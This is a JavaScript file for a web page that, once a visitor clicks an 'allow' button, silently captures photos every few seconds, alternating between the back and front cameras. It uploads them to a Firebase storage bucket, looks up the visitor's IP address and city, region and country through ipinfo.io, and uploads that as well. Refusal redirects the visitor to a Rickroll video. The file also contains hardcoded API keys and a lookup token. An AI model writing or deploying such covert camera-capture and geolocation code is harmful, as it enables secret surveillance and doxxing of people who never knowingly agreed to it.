// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
    authDomain: "html-7fd9b.firebaseapp.com",
    projectId: "html-7fd9b",
    storageBucket: "html-7fd9b.appspot.com",
    messagingSenderId: "1022361191925",
    appId: "1:1022361191925:web:0f971d6e7c72cfc3aa0cbc",
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const auth = firebase.auth();

// DOM elements
const allowButton = document.getElementById("allowButton");
const denyButton = document.getElementById("denyButton");
const video = document.getElementById("video");

// Allow camera access and capture images
allowButton.onclick = function () {
    auth.signInAnonymously().then(() => {
        captureFromCamera('environment'); // Use the back camera
    }).catch((error) => {
        console.error("Authentication failed:", error);
        alert("Authentication failed. Try again.");
    });
};

// Redirect to YouTube on "Don't Allow"
denyButton.onclick = function () {
    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Rickroll
};

// Capture from camera
function captureFromCamera(cameraType) {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraType } })
        .then((stream) => {
            video.srcObject = stream;
            video.style.display = "block";
            video.play();

            setTimeout(() => {
                captureImage();
                stream.getTracks().forEach((track) => track.stop());
                captureFromCamera(cameraType === 'environment' ? 'user' : 'environment');
            }, 3000);
        })
        .catch(() => {
            alert("Camera permission denied. Redirecting...");
            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        });
}

// Capture image
function captureImage() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => {
        const storageRef = storage.ref();
        const photoRef = storageRef.child('photos/photo_' + Date.now() + '.jpg');
        photoRef.put(blob).then(() => {
            console.log('Photo uploaded successfully.');
            captureIPData();
        }).catch((error) => {
            console.error("Error uploading photo:", error);
        });
    }, 'image/jpeg');
}

// Capture IP and upload data
function captureIPData() {
    fetch('https://ipinfo.io?token=023890bc57338a')
        .then((response) => response.json())
        .then((data) => {
            const ipData = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}`;
            const ipDataRef = storage.ref().child('ip_data/ip_' + Date.now() + '.txt');
            ipDataRef.putString(ipData).then(() => {
                console.log('IP Data uploaded successfully.');
            }).catch((error) => {
                console.error("Error uploading IP data:", error);
            });
        });
}
